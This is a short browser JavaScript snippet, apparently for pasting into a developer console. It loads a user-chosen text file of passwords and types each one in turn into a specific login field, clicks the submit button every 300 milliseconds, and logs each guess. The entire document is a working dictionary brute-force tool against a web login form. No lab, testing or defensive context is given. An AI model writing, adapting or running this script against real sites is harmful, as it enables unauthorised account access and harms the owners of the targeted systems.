(async function () {
  const input = document.createElement('input');
  input.type = 'file';
  input.accept = '.txt';

  input.onchange = async (e) => {
    const file = e.target.files[0];
    if (!file) return;

    const text = await file.text();
    const passwords = text.split('\n').map(p => p.trim()).filter(Boolean);

    const delayMs = 300;
    const inputSelector = "#ext-comp-1026";
    const buttonSelector = "#ext-gen52";

    for (let i = 0; i < passwords.length; i++) {
      const input = document.querySelector(inputSelector);
      const button = document.querySelector(buttonSelector);

      if (!input) {
        console.log("Password input not found.");
        return;
      }

      input.focus();
      input.value = passwords[i];
      input.dispatchEvent(new Event("input", { bubbles: true }));
      input.dispatchEvent(new Event("change", { bubbles: true }));

      if (button) {
        button.click();
       console.log(`Trying password ${i + 1}: ${passwords[i]}`);
      } else {
        console.log("Button not found.");
      }

      await new Promise(resolve => setTimeout(resolve, delayMs));
    }

    console.log("All password attempts completed.");
  };

  input.click(); // open file picker
})();